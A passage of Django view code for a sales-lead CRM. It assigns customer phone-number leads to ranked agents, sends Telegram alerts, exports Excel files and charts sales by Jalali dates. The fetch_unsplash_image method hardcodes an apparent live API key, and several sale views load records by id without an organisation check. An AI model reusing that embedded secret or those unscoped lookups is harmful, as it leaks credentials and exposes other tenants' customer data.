            chat_settings = ChatSetting.load()
            form.initial = {'override_chat_id': chat_settings.override_chat_id, 'chat_id': chat_settings.chat_id}
        
        return form

    def get_context_data(self, form, **kwargs):
        context = super().get_context_data(form=form, **kwargs)
        
        if self.steps.current == 'distribution_info':
            category_data = self.get_cleaned_data_for_step('category')
            
            if category_data:
                category = category_data['category']
                alternate_category = category_data['alternate_category']
            
                # Calculate lead details
                context.update(self.calculate_lead_details(category, alternate_category))
            
        elif self.steps.current == 'confirm':
            # Set up data for confirmation
            context = self.setup_confirmation_data(context)

        return context
        

    def calculate_lead_details(self, category, alternate_category):
        user = self.request.user
        category = self.get_cleaned_data_for_step('category')['category']
        alternate_category = self.get_cleaned_data_for_step('category')['alternate_category']
        category_id = category.id
        alternate_category_id = alternate_category.id

        leads = Lead.objects.filter(organisation=user.userprofile, category=category_id, agent__isnull=True)
        new_leads = leads.annotate(phone_length=Length('phone_number')).filter(phone_length=11).count()
        # new_912_leads = leads.filter(phone_number__startswith='0912').annotate(phone_length=Length('phone_number')).filter(phone_length=11).count()
        # foreign_or_wrong_leads = leads.annotate(phone_length=Length('phone_number')).exclude(phone_length=11).count()
        extra = Lead.objects.filter(organisation=user.userprofile, category=alternate_category_id, agent__isnull=True).annotate(phone_length=Length('phone_number')).filter(phone_length=11).count()

        total_new_leads = new_leads
        active_agents_count = self.get_active_agents_count()

        recommended_leads_per_agent = self.compute_initial_distribution(total_new_leads, active_agents_count, category)
        self.request.session['total_new_leads'] = total_new_leads
        return {
            'total_new_leads': total_new_leads,
            # 'new_912_leads': new_912_leads,
            'extra': extra,
            # 'foreign_or_wrong_leads': foreign_or_wrong_leads,
            'active_agents': active_agents_count,
            'recommended_leads_per_agent': recommended_leads_per_agent,
            'display_data': True,
        }
    
    
    
    

    def assign_leads_to_agent(self, df):
        user = self.request.user
        if df is None: 
            return

        for col in df:
            alt_name = df[col].name
            numbers = df[col].values

            try:
                agent = Agent.objects.get(organisation=user.userprofile, user__alt_name=alt_name)
                for number in numbers:
                    lead = Lead.objects.get(phone_number=number['phone_number'])
                    lead.agent = agent
                    lead.save()

                    # Add the lead's number to BankNumbers if it doesn't exist
                    bank_number, created = BankNumbers.objects.get_or_create(
                        organisation=user.userprofile,
                        number=lead.phone_number, 
                        defaults={'agent': agent, 'organisation': agent.organisation}
                    )
                    if not created:
                        print(f"Number {lead.phone_number} already exists in BankNumbers.")
            except User.DoesNotExist:
                print(f"No user found with alt_name: {alt_name}")
            except Agent.DoesNotExist:
                print(f"No agent found for user with alt_name: {alt_name}")
            except Lead.DoesNotExist:
                print(f"No lead found with phone_number: {number}")

    def done(self, form_list, **kwargs):
        self.request.session['current_wizard_step'] = self.steps.current
        chat_override_data = self.get_cleaned_data_for_step('chat_override')
        if chat_override_data:
            chat_settings = ChatSetting.load()
            chat_settings.override_chat_id = chat_override_data['override_chat_id']
            chat_settings.chat_id = chat_override_data['chat_id']
            chat_settings.save()
        
        context = self.get_context_data(None)
        df_rank1 = context.get('df_rank1')
        df_rank2 = context.get('df_rank2')
        df_rank3 = context.get('df_rank3')
        df_rank4 = context.get('df_rank4')
        df_rank1_json = df_rank1.to_json()
        df_rank2_json = df_rank2.to_json()
        df_rank3_json = df_rank3.to_json()
        df_rank4_json = df_rank4.to_json()
        
        self.assign_leads_to_agent(df_rank1)
        self.assign_leads_to_agent(df_rank2)
        self.assign_leads_to_agent(df_rank3)
        self.assign_leads_to_agent(df_rank4)
    
        organisor_id = self.request.user.userprofile.id

        for df in [df_rank1, df_rank2, df_rank3, df_rank4]:
            for agent_name, phone_data in json.loads(df.to_json()).items():
                # Check if phone_data is empty or None:
                if not phone_data:
                    continue
                
                user = User.objects.get(alt_name=agent_name)
                rank = user.rank
                message = create_agent_message(agent_name, rank, phone_data)
                
                # Apply chat_settings override if needed:
                chat_settings = ChatSetting.load()
                if chat_settings.override_chat_id and chat_settings.chat_id:
                    chat_id = chat_settings.chat_id
                else:
                    chat_id = user.agent.chat_id or '-1001707390535'
                
                # Schedule the message sending:
                notify_background_messages(chat_id, message, organisor_id)

        new_df_rank1, new_df_rank2, new_df_rank3, new_df_rank4 = self.generate_excel_dataframes(df_rank1, df_rank2, df_rank3, df_rank4)

         # Generate a unique file name
        file_name = f"output_{uuid.uuid4().hex}.xlsx"

        # Assuming MEDIA_URL and MEDIA_ROOT are correctly set up in your Django settings
        excel_file_path = os.path.join(settings.MEDIA_ROOT, file_name)

        if not os.path.exists(settings.MEDIA_ROOT):
            os.makedirs(settings.MEDIA_ROOT)

        with pd.ExcelWriter(excel_file_path) as writer:
            new_df_rank1.to_excel(writer, sheet_name="rank 1", index=False)
            new_df_rank2.to_excel(writer, sheet_name="rank 2", index=False)
            new_df_rank3.to_excel(writer, sheet_name="rank 3", index=False)
            new_df_rank4.to_excel(writer, sheet_name="rank 4", index=False)

        # Store the file path in the session so it can be accessed in the next view

        self.request.session['excel_file_path'] = os.path.join(settings.MEDIA_URL, file_name)

        return redirect('leads:download_excel_page')
    
    def generate_excel_dataframes(self, df_rank1, df_rank2, df_rank3, df_rank4):
        df_rank1 = self.create_dataframe_with_phone_numbers(df_rank1)
        df_rank2 = self.create_dataframe_with_phone_numbers(df_rank2)
        df_rank3 = self.create_dataframe_with_phone_numbers(df_rank3)
        df_rank4 = self.create_dataframe_with_phone_numbers(df_rank4)

        return df_rank1, df_rank2, df_rank3, df_rank4
    
    def create_dataframe_with_phone_numbers(self, dataframe):
        new_dataframe = dataframe.copy()  # Create a copy to avoid modifying the original DataFrame

        for column in new_dataframe.columns:
            new_dataframe[column] = new_dataframe[column].apply(lambda x: x['phone_number'] if isinstance(x, dict) else x)

        return new_dataframe
    

    def compute_initial_distribution(self, N, active_agents_count, category=None):
        user = self.request.user
        if category:
            N = Lead.objects.filter(organisation=user.userprofile, category=category, agent__isnull=True).count()
        # Step 1: Assign numbers to each rank based on the percentages
        rank1_numbers = N * 40 // 100
        rank2_numbers = N * 30 // 100
        rank3_numbers = N * 20 // 100
        rank4_numbers = N * 10 // 100

        # Step 2: Get initial each_rank values
        each_rank1 = rank1_numbers // active_agents_count['rank_1'] if active_agents_count['rank_1'] != 0 else 0
        each_rank2 = rank2_numbers // active_agents_count['rank_2'] if active_agents_count['rank_2'] != 0 else 0
        each_rank3 = rank3_numbers // active_agents_count['rank_3'] if active_agents_count['rank_3'] != 0 else 0
        each_rank4 = rank4_numbers // active_agents_count['rank_4'] if active_agents_count['rank_4'] != 0 else 0

        # Step 3: Adjust each_rank values if necessary
        total_numbers_assigned = (
            each_rank1 * active_agents_count['rank_1']
            + each_rank2 * active_agents_count['rank_2']
            + each_rank3 * active_agents_count['rank_3']
            + each_rank4 * active_agents_count['rank_4']
        )
        while total_numbers_assigned > N:
            each_rank1 -= 1
            each_rank2 = each_rank1 - 1
            each_rank3 = each_rank2 - 1
            each_rank4 = each_rank3
            total_numbers_assigned = (
                each_rank1 * active_agents_count['rank_1']
                + each_rank2 * active_agents_count['rank_2']
                + each_rank3 * active_agents_count['rank_3']
                + each_rank4 * active_agents_count['rank_4']
            )

        # Step 4: Distribute remaining numbers equally among all agents
        remaining_numbers = N - total_numbers_assigned
        extra_numbers_per_agent = remaining_numbers // (
            active_agents_count['rank_1']
            + active_agents_count['rank_2']
            + active_agents_count['rank_3']
            + active_agents_count['rank_4']
        )
        each_rank1 += extra_numbers_per_agent
        each_rank2 += extra_numbers_per_agent
        each_rank3 += extra_numbers_per_agent
        each_rank4 += extra_numbers_per_agent

        return {
            "rank1": each_rank1 if each_rank1 else 0,
            "rank2": each_rank2 if each_rank2 else 0,
            "rank3": each_rank3 if each_rank3 else 0,
            "rank4": each_rank4 if each_rank4 else 0,
            "remaining": N - total_numbers_assigned - extra_numbers_per_agent * (
                active_agents_count['rank_1']
                + active_agents_count['rank_2']
                + active_agents_count['rank_3']
                + active_agents_count['rank_4']
            ),
        }

    def distribute_leads(self, unassigned_leads, unassigned_912_leads, recommended_leads_per_agent, extra):
        organisor = self.request.user
        # This function will distribute the leads to the agents using pandas
        # and return a dataframe with the distribution
        active_agents_rank1 = [agent['user__alt_name'] for agent in Agent.objects.filter(organisation=organisor.userprofile, user__rank=1, is_available_for_leads=True).values('user__alt_name')]
        active_agents_rank2 = [agent['user__alt_name'] for agent in Agent.objects.filter(organisation=organisor.userprofile, user__rank=2, is_available_for_leads=True).values('user__alt_name')]
        active_agents_rank3 = [agent['user__alt_name'] for agent in Agent.objects.filter(organisation=organisor.userprofile, user__rank=3, is_available_for_leads=True).values('user__alt_name')]
        active_agents_rank4 = [agent['user__alt_name'] for agent in Agent.objects.filter(organisation=organisor.userprofile, user__rank=4, is_available_for_leads=True).values('user__alt_name')]

        random.shuffle(unassigned_leads)
        random.shuffle(unassigned_912_leads)
        random.shuffle(extra)

        dist_list = unassigned_912_leads + unassigned_leads + extra

        df_rank1 = pd.DataFrame(columns=active_agents_rank1)
        df_rank2 = pd.DataFrame(columns=active_agents_rank2)
        df_rank3 = pd.DataFrame(columns=active_agents_rank3)
        df_rank4 = pd.DataFrame(columns=active_agents_rank4)

        for i in range(recommended_leads_per_agent["rank1"]):
            df_rank1.loc[len(df_rank1)] = dist_list[:len(df_rank1.columns)]
            dist_list = dist_list[len(df_rank1.columns):]

        for i in range(recommended_leads_per_agent["rank2"]):
            df_rank2.loc[len(df_rank2)] = dist_list[:len(df_rank2.columns)]
            dist_list = dist_list[len(df_rank2.columns):]

        for i in range(recommended_leads_per_agent["rank3"]):
            df_rank3.loc[len(df_rank3)] = dist_list[:len(df_rank3.columns)]
            dist_list = dist_list[len(df_rank3.columns):]

        for i in range(recommended_leads_per_agent["rank4"]):
            df_rank4.loc[len(df_rank4)] = dist_list[:len(df_rank4.columns)]
            dist_list = dist_list[len(df_rank4.columns):]
        
        return df_rank1, df_rank2, df_rank3, df_rank4

    def get_active_agents_count(self):
        organisor = self.request.user
        active_agents_count = {
            'rank_1': Agent.objects.filter(organisation=organisor.userprofile, user__rank=1, is_available_for_leads=True).count(),
            'rank_2': Agent.objects.filter(organisation=organisor.userprofile, user__rank=2, is_available_for_leads=True).count(),
            'rank_3': Agent.objects.filter(organisation=organisor.userprofile, user__rank=3, is_available_for_leads=True).count(),
            'rank_4': Agent.objects.filter(organisation=organisor.userprofile, user__rank=4, is_available_for_leads=True).count(),
        }
        return active_agents_count

    def setup_confirmation_data(self, context):
        user = self.request.user
        distribution_data = self.get_cleaned_data_for_step('distribution_info')
        
        category = Category.objects.get(pk=self.get_cleaned_data_for_step('category')['category'].id)
        alternate_category = Category.objects.get(pk=self.get_cleaned_data_for_step('category')['alternate_category'].id)        

    

        unassigned_leads = list(Lead.objects.filter(organisation=user.userprofile, agent__isnull=True, category=category).exclude(phone_number__startswith='0912').annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
        unassigned_912_leads = list(Lead.objects.filter(organisation=user.userprofile, agent__isnull=True, category=category, phone_number__startswith='0912').annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
        extra = list(Lead.objects.filter(organisation=user.userprofile, agent__isnull=True, category=alternate_category).annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
        recommended_leads_per_agent = distribution_data

        df_rank1, df_rank2, df_rank3, df_rank4 = self.distribute_leads(unassigned_leads, unassigned_912_leads, recommended_leads_per_agent, extra)
        context.update({
            'df_rank1': df_rank1,
            'df_rank2': df_rank2,
            'df_rank3': df_rank3,
            'df_rank4': df_rank4,
            'df_rank1_json': df_rank1.to_json(orient='records'),
            'df_rank2_json': df_rank2.to_json(orient='records'),
            'df_rank3_json': df_rank3.to_json(orient='records'),
            'df_rank4_json': df_rank4.to_json(orient='records'),
            'display_distribution': True,
        })

        return context

class SearchLeadsView(View):
    def get(self, request, *args, **kwargs):
        query = request.GET.get('q', '')
        user = request.user
        leads = Lead.objects.none()  # Default to no leads

        if hasattr(user, 'is_organisor') and user.is_organisor:
            leads = Lead.objects.filter(
                organisation=user.userprofile.id, phone_number__icontains=query)
        elif hasattr(user, 'is_agent') and user.is_agent:
            leads = Lead.objects.filter(
                agent__user=user, phone_number__icontains=query)
        data = []
        for lead in leads:
            if lead.category:
                data.append({'id': lead.id, 'phone_number': lead.phone_number, 'category': lead.category.name})

            else:
                data.append({'id': lead.id, 'phone_number': lead.phone_number})
        
        return JsonResponse(data, safe=False)
    
class SearchBankView(View):
    def get(self, request, *args, **kwargs):
        query = request.GET.get('q', '')
        user = request.user
        numbers = BankNumbers.objects.none()  # Default to no leads
        
        if hasattr(user, 'is_organisor') and user.is_organisor:
            numbers = BankNumbers.objects.filter(
                organisation=user.userprofile.id, number__icontains=query)
        data = []
        for number in numbers:
            if number.agent:
                data.append({'id': number.id, 'number': number.number, 'agent': number.agent.user.alt_name})
            else:
                data.append({'id': number.id, 'number': number.number})

        return JsonResponse(data, safe=False)
    
class MyDayView(LoginRequiredMixin, generic.ListView):
    template_name = 'leads/my_day.html'
    context_object_name = 'leads_today'

    def get_random_static_image(self):
        # Define the path to your static images folder
        static_image_dir = os.path.join(settings.BASE_DIR, 'static', 'images', 'background')

        # List all files in the static images folder
        image_files = [f for f in os.listdir(static_image_dir) if os.path.isfile(os.path.join(static_image_dir, f))]
        print(image_files)
        if image_files:
            # Select a random image file path
            random_image = random.choice(image_files)
            # Construct the full URL for the selected image
            random_image_url = f"{settings.STATIC_URL}images/background/{random_image}"
            return random_image_url
        else:
            # Return a default image URL or handle the case when no images are found
            return os.path.join(settings.STATIC_URL, 'images','background', 'pexels-bob-ward-3647693.jpg')

    def fetch_unsplash_image(self):
        url = "https://api.unsplash.com/photos/random"
        headers = {
            "Authorization": "Client-ID 0RZY8EPO_QZhkKRv7sI2Q4RfOZaimD8tQEnhPVRnTAM"  # Replace with your API key
        }
        params = {
            "orientation": "landscape",
            "query": "luxury",
        }
        try:
            response = requests.get(url, headers=headers, params=params)
            response.raise_for_status()  # Raise an exception for HTTP errors
            data = response.json()
            return data['urls']['full']
        except requests.exceptions.RequestException as e:
            # Handle the error, and provide a default image URL
            print(f"Error fetching image from Unsplash API: {e}")
            return self.get_random_static_image()
        
    predefined_quotes = [
        "Success is not final, failure is not fatal: It is the courage to continue that counts. - Winston Churchill",
        "The only limit to our realization of tomorrow will be our doubts of today. - Franklin D. Roosevelt",
        "Your time is limited, don't waste it living someone else's life. - Steve Jobs",
        "Every moment is a fresh beginning." ,
        "Play by the rules, but be ferocious." ,
        "Fall seven times and stand up eight. Japanese Proverb.",
        "Avoiding mistakes costs more than making them." ,
        "The road to success and the road to failure are almost exactly the same. Colin R."
        ]

    # Define the fetch_quotes function to fetch a random quote from the API or the predefined list
    def fetch_quotes(self):
        url = "https://api.quotable.io/random?tags=success,growth"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return data.get("content", random.choice(self.predefined_quotes))  # Use a random predefined quote if API fetch fails
        else:
            return random.choice(self.predefined_quotes) 
        
    def get_queryset(self):
        today = timezone.now().date()
        # Note: You are subtracting 1 from user ID. Is this intentional?
        return Lead.objects.filter(agent__user=self.request.user, date_assigned__date=today)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        today = datetime.today().date()
        user = self.request.user
        context['daily_numbers'] = Lead.objects.filter(organisation=user.agent.organisation, agent__user=user, date_assigned__date=today)
        context['background_image'] = self.fetch_unsplash_image()
        context['duplicates_to_follow'] = DuplicateToFollow.objects.filter(agent__user = self.request.user, date_added = today)
        context['random_quote'] = self.fetch_quotes() 

        return context

    def dispatch(self, request, *args, **kwargs):
        if not hasattr(request.user, 'is_agent') or not request.user.is_agent:
            return redirect('leads:lead-list') 
        return super().dispatch(request, *args, **kwargs) 
    
class SaleCreateView(OrganisorAndLoginRequiredMixin, generic.CreateView):
    template_name = "leads/sales_create.html"
    form_class = SaleModelForm

    def get_success_url(self):
        return reverse("leads:lead-detail", kwargs={"pk": self.kwargs["pk"]})

    def get_context_data(self, **kwargs):
        context = super(SaleCreateView, self).get_context_data(**kwargs)
        context.update({"lead": Lead.objects.get(pk=self.kwargs["pk"])})
        return context

    def form_valid(self, form):
        lead = Lead.objects.get(pk=self.kwargs["pk"])
        user = self.request.user
        # Check if there is an agent assigned to the lead
        if not lead.agent:
            messages.error(self.request, "You cannot create a sale for a lead without an assigned agent.")
            return self.form_invalid(form)

        sale = form.save(commit=False)
        sale.lead = lead
        if user.is_organisor:
            sale.organisation = self.request.user.userprofile  # Assuming the user is logged in and has an associated organisation
        else:
            sale.organisation = lead.organisation  # Assuming the user is logged in and has an associated organisation
        sale.agent = sale.lead.agent  # Assuming the user is logged in and has an associated agent
        sale.save()
        return super(SaleCreateView, self).form_valid(form)

class SaleUpdateView(LoginRequiredMixin, generic.UpdateView):
    template_name = "leads/sales_update.html"
    form_class = SaleModelForm

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = Sale.objects.filter(organisation=user.userprofile, lead=self.kwargs['pk'])
        else:
            queryset = Sale.objects.filter(
                lead__organisation=user.agent.organisation
            )
            # filter for the agent that is logged in
            queryset = queryset.filter(lead=self.kwargs['pk'])
        print(queryset)
        return queryset
    
    def get_context_data(self, **kwargs):
        context = super(SaleUpdateView, self).get_context_data(**kwargs)
        context.update({"lead": Lead.objects.get(pk=self.kwargs["pk"])})
        return context

    def get_success_url(self):
        return reverse("leads:lead-detail", kwargs={"pk": self.get_object().lead.id})

class LeadSalesEditView(OrganisorAndLoginRequiredMixin, generic.FormView):
    template_name = 'leads/sales_update.html'
    form_class = modelformset_factory(Sale, form=SaleModelForm, extra=0)

    def get_success_url(self):
        return reverse("leads:lead-detail", kwargs={"pk": self.kwargs['pk']})

    def get_form_kwargs(self):
        kwargs = super(LeadSalesEditView, self).get_form_kwargs()
        sale_instances = Sale.objects.filter(lead_id=self.kwargs['pk'])
        print(sale_instances)
        kwargs.update({
            'queryset': sale_instances,
        })
        return kwargs

    def form_valid(self, formset):
        instances = formset.save(commit=False)
        for obj in instances:
            obj.save()
        return super(LeadSalesEditView, self).form_valid(formset)
    
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        sale_instances = Sale.objects.filter(lead_id=self.kwargs['pk'])
        context['formset'] = self.get_form()
        context['lead'] = get_object_or_404(Lead, pk=self.kwargs['pk'])
        context['sale_instances'] = sale_instances
        return context    
        
class SaleDeleteView(OrganisorAndLoginRequiredMixin, generic.DeleteView):
    model = Sale
    template_name = "leads/sales_delete.html"
    
    def get_success_url(self):
        return reverse("leads:lead-detail", kwargs={"pk": self.object.lead.pk})

    def get_object(self, queryset=None):
        sale_pk = self.kwargs.get("pk")
        sale = get_object_or_404(Sale, pk=sale_pk)
        print(sale)
        return sale
    
    def delete(self, request, *args, **kwargs):
        # This will delete the object
        response = super().delete(request, *args, **kwargs)
        
        # Check if it's an AJAX call
        if request.is_ajax():
            # Return a JSON response
            return JsonResponse({"success": True})
        
        # Otherwise, return the normal response
        return response
    
class SaleListView(OrganisorAndLoginRequiredMixin, generic.ListView):
    model = Sale
    template_name = "leads/sales_list.html"
    context_object_name = "sales"

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        user = self.request.user
        
        # For all sales
        if user.is_organisor:
            context["all_sales"] = Sale.objects.filter(lead__organisation=user.userprofile).order_by('-date')
        else:
            context["all_sales"] = Sale.objects.filter(lead__organisation=user.agent.organisation, lead__agent__user=user).order_by('-date')
        
        # For monthly sales
        jalali_today = khayyam.JalaliDate.today()
        first_day_of_month = khayyam.JalaliDate(jalali_today.year, jalali_today.month, 1).todate()
        context["monthly_sales"] = context["all_sales"].filter(date__gte=first_day_of_month)

        # Calculate agent sales data
        agent = self.request.user.id
        today = JalaliDate.today()  # Use JalaliDate from persiantools
        
        # Calculate the start of the week (Saturday) and month (first day of the month)
        # Convert JalaliDate to a Gregorian date
        gregorian_today = today.to_gregorian()

        # Find out how many days we are away from the last Saturday
        days_since_last_saturday = gregorian_today.weekday() + 2  # +1 to shift from Monday-start to Sunday-start, another +1 to make Sunday = 1, Monday = 2, ..., Saturday = 7

        # Subtract those days
        start_of_week_gregorian = gregorian_today - timedelta(days=days_since_last_saturday % 7)  # % 7 makes sure that if today is Saturday, we subtract 0 days

        # Convert back to JalaliDate
        start_of_week = JalaliDate(start_of_week_gregorian)
        start_of_month = today.replace(day=1)

        base_filter_args = {}
        if user.is_organisor:
            # Aggregate sales
            daily_sales = Sale.objects.filter(organisation=user.userprofile, date__date=today.to_gregorian()).aggregate(Sum('amount'))['amount__sum'] or 0
            weekly_sales = Sale.objects.filter(organisation=user.userprofile, date__date__range=(start_of_week.to_gregorian(), today.to_gregorian())).aggregate(Sum('amount'))['amount__sum'] or 0
            monthly_sales = Sale.objects.filter(organisation=user.userprofile, date__date__range=(start_of_month.to_gregorian(), today.to_gregorian())).aggregate(Sum('amount'))['amount__sum'] or 0
            total_sales = Sale.objects.filter(organisation=user.userprofile).aggregate(Sum('amount'))['amount__sum'] or 0
        elif user.is_agent:
            # Aggregate sales
            daily_sales = Sale.objects.filter(organisation=user.agent.organisation, agent=user.agent, date__date=today.to_gregorian()).aggregate(Sum('amount'))['amount__sum'] or 0
            weekly_sales = Sale.objects.filter(organisation=user.agent.organisation, agent=user.agent, date__date__range=(start_of_week.to_gregorian(), today.to_gregorian())).aggregate(Sum('amount'))['amount__sum'] or 0
            monthly_sales = Sale.objects.filter(organisation=user.agent.organisation, agent=user.agent, date__date__range=(start_of_month.to_gregorian(), today.to_gregorian())).aggregate(Sum('amount'))['amount__sum'] or 0
            total_sales = Sale.objects.filter(organisation=user.agent.organisation, agent=user.agent).aggregate(Sum('amount'))['amount__sum'] or 0

        context["sales_data"] = {
            'daily_sales': daily_sales,
            'weekly_sales': weekly_sales,
            'monthly_sales': monthly_sales,
            'total_sales': total_sales,
        }

        if user.is_organisor:
            # Filter leads for the organisation in the last month
            total_leads = Lead.objects.filter(organisation=user.userprofile, date_assigned__date__range=(start_of_month.to_gregorian(), today.to_gregorian())).count()
            total_leads_overall = Lead.objects.filter(organisation=user.userprofile).count()

            print(total_leads)
            # Filter sales made by the organisation in the last month
            converted_leads = Sale.objects.filter(organisation=user.userprofile, date__date__range=(start_of_month.to_gregorian(), today.to_gregorian())).values('lead').distinct().count()
            converted_leads_overall = Sale.objects.filter(organisation=user.userprofile).values('lead').distinct().count()

            print(converted_leads)
            if total_leads == 0:
                percentage = 0
            else:
                percentage = (converted_leads / total_leads) * 100

            if total_leads_overall == 0:
                percentage_overall = 0
            else:
                percentage_overall = (converted_leads_overall / total_leads_overall) * 100

            agents_data = {
                'total_leads': total_leads,
                'converted_leads': converted_leads,
                'percentage': percentage,
                'total_leads_overall': total_leads_overall,
                'converted_leads_overall': converted_leads_overall,
                'percentage_overall': percentage_overall,
            }

        else:
            # Filter leads for the agent in the last month
            total_leads = Lead.objects.filter(organisation=user.agent.organisation,agent__user=user, date_assigned__date__range=(start_of_month.to_gregorian(), today.to_gregorian())).count()
            total_leads_overall = Lead.objects.filter(organisation=user.agent.organisation,agent__user=user).count()

            # Filter sales made by the agent in the last month
            converted_leads = Sale.objects.filter(organisation=user.agent.organisation,lead__agent__user=user, date__date__range=(start_of_month.to_gregorian(), today.to_gregorian())).values('lead').distinct().count()
            converted_leads_overall = Sale.objects.filter(organisation=user.agent.organisation,lead__agent__user=user).values('lead').distinct().count()

            if total_leads == 0:
                percentage = 0
            else:
                percentage = (converted_leads / total_leads) * 100

            if total_leads_overall == 0:
                percentage_overall = 0
            else:
                percentage_overall = (converted_leads_overall / total_leads_overall) * 100

            agents_data = {
                'total_leads': total_leads,
                'converted_leads': converted_leads,
                'percentage': percentage,
                'total_leads_overall': total_leads_overall,
                'converted_leads_overall': converted_leads_overall,
                'percentage_overall': percentage_overall,
            }

        context['agents_data'] = agents_data



        
        return context

def jalali_converter(date):
    """Convert a Gregorian date to a Jalali date string."""
    jalali_date = jdatetime.date.fromgregorian(date=date)
    return jalali_date.strftime('%Y-%m-%d')

def get_month_dates():
    # Get the current Jalali date
    jalali_today = jdatetime.date.today()

    # Determine the start of the Jalali month
    jalali_start_of_month = jdatetime.date(jalali_today.year, jalali_today.month, 1)

    # Determine the end of the Jalali month (by getting the last day of the month)
    if jalali_today.month in [1, 2, 3, 4, 5, 6]:
        last_day = 31
    elif jalali_today.month in [7, 8, 9, 10, 11]:
        last_day = 30
    else:  # Esfand
        if jdatetime.date(jalali_today.year, 12, 29).isleap():
            last_day = 30
        else:
            last_day = 29

    jalali_end_of_month = jdatetime.date(jalali_today.year, jalali_today.month, last_day)

    # Convert the start and end of the Jalali month to Gregorian
    gregorian_start_of_month = jalali_start_of_month.togregorian()
    gregorian_end_of_month = jalali_end_of_month.togregorian()

    # Generate dates for the entire Jalali month
    delta = gregorian_end_of_month - gregorian_start_of_month
    return [gregorian_start_of_month + timedelta(days=i) for i in range(delta.days + 1)]

def get_week_dates():
    today = timezone.now().date()
    days_since_saturday = (today.weekday() - 5) % 7
    saturday = today - timedelta(days=days_since_saturday)
    return [saturday + timedelta(days=i) for i in range(7)]

def get_6_month_dates():
    today = timezone.now().date()
    jalali_today = jdatetime.date.fromgregorian(date=today)
    jalali_month_starts = []
    
    for i in range(6):
        day_of_month = jalali_today.day
        # Subtract days to reach the first of the month
        first_of_jalali_month = jalali_today - jdatetime.timedelta(days=day_of_month - 1)
        jalali_month_starts.append(first_of_jalali_month)
        # Move to the previous month
        jalali_today = first_of_jalali_month - jdatetime.timedelta(days=1)
    
    return [start_date.togregorian() for start_date in jalali_month_starts][::-1]

JALALI_MONTH_NAMES = {
    1: "فروردین",
    2: "اردیبهشت",
    3: "خرداد",
    4: "تیر",
    5: "مرداد",
    6: "شهریور",
    7: "مهر",
    8: "آبان",
    9: "آذر",
    10: "دی",
    11: "بهمن",
    12: "اسفند"
}

def get_year_dates():
    today = timezone.now().date()
    return [today.replace(year=today.year - i, month=1, day=1) for i in range(12)][::-1]

class DailySalesChart(BaseLineChartView):

    def __init__(self, request=None):
        self.request = request
        super().__init__()

    def get_labels(self):
        self.gregorian_dates = get_month_dates()
        return [jalali_converter(date) for date in self.gregorian_dates]

    def get_data(self):
        user = self.request.user
        daily_sales = []
        for date in self.gregorian_dates:
            if user.is_organisor:
                sales_for_day = Sale.objects.filter(lead__organisation=user.userprofile, date__date=date).aggregate(Sum('amount'))['amount__sum'] or 0
            else:
                sales_for_day = Sale.objects.filter(lead__agent__user=user, date__date=date).aggregate(Sum('amount'))['amount__sum'] or 0
            daily_sales.append(sales_for_day)
        return [daily_sales]

class WeeklySalesChart(BaseLineChartView):

    def __init__(self, request=None):
        self.request = request
        super().__init__()
        
    def get_labels(self):
        self.gregorian_dates = get_week_dates()
        return [f"{date.strftime('%A')} ({jalali_converter(date)})" for date in self.gregorian_dates]

    def get_data(self):
        user = self.request.user
        weekly_sales = []
        for start_date in self.gregorian_dates:
            end_date = start_date + timedelta(days=6)  # One day range for each day of the week
            if user.is_organisor:
                sales_for_week = Sale.objects.filter(lead__organisation=user.userprofile, date__date=(start_date)).aggregate(Sum('amount'))['amount__sum'] or 0
            else:
                sales_for_week = Sale.objects.filter(lead__agent__user=user, date__date=(start_date)).aggregate(Sum('amount'))['amount__sum'] or 0
            weekly_sales.append(sales_for_week)
        return [weekly_sales]

class MonthlySalesChart(BaseLineChartView):

    def __init__(self, request=None):
        self.request = request
        super().__init__()

    def get_labels(self):
        self.gregorian_dates = get_6_month_dates()
        jalali_dates = [jdatetime.date.fromgregorian(date=greg_date) for greg_date in self.gregorian_dates]
        return [JALALI_MONTH_NAMES[jalali_date.month] for jalali_date in jalali_dates]

    def get_data(self):
        user = self.request.user
        monthly_sales = []
        for start_date in self.gregorian_dates:
            greg_end_date = start_date + relativedelta(months=1) - timedelta(days=1)
            if user.is_organisor:
                sales_for_month = Sale.objects.filter(lead__organisation=user.userprofile, date__date__range=(start_date, greg_end_date)).aggregate(Sum('amount'))['amount__sum'] or 0
            else:
                sales_for_month = Sale.objects.filter(lead__agent__user=user, date__date__range=(start_date, greg_end_date)).aggregate(Sum('amount'))['amount__sum'] or 0
            monthly_sales.append(sales_for_month)
        return [monthly_sales]
    
class YearlySalesChart(BaseLineChartView):

    def __init__(self, request=None):
        self.request = request
        super().__init__()

    def get_labels(self):
        self.gregorian_dates = get_year_dates()
        return [jalali_converter(date).split('-')[0] for date in self.gregorian_dates]  # Only show the year

    def get_data(self):
        user = self.request.user
        yearly_sales = []
        for start_date in self.gregorian_dates:
            end_date = start_date.replace(year=start_date.year + 1) - timedelta(days=1)
            if user.is_organisor:
                sales_for_year = Sale.objects.filter(lead__organisation=user.userprofile, date__date__range=(start_date, end_date)).aggregate(Sum('amount'))['amount__sum'] or 0
            else:
                sales_for_year = Sale.objects.filter(lead__agent__user=user, date__date__range=(start_date, end_date)).aggregate(Sum('amount'))['amount__sum'] or 0
            yearly_sales.append(sales_for_year)
        return [yearly_sales]

class SourceListView(OrganisorAndLoginRequiredMixin, generic.ListView):
    template_name = "leads/source_list.html"
    context_object_name = "source_list"

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        
        queryset = Source.objects.filter(organisation=user.userprofile)
        queryset = queryset.annotate(lead_count=Count('leads')).values('pk', 'name', 'lead_count')
        return queryset

class SourceDetailView(OrganisorAndLoginRequiredMixin, generic.DetailView):
    template_name = "leads/source_detail.html"
    context_object_name = "source"

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        queryset = Source.objects.filter(organisation=user.userprofile)
        
        return queryset

class SourceCreateView(OrganisorAndLoginRequiredMixin, generic.CreateView):
    template_name = "leads/source_create.html"
    form_class = SourceModelForm

    def get_success_url(self):
        return reverse("leads:source-list")

    def form_valid(self, form):
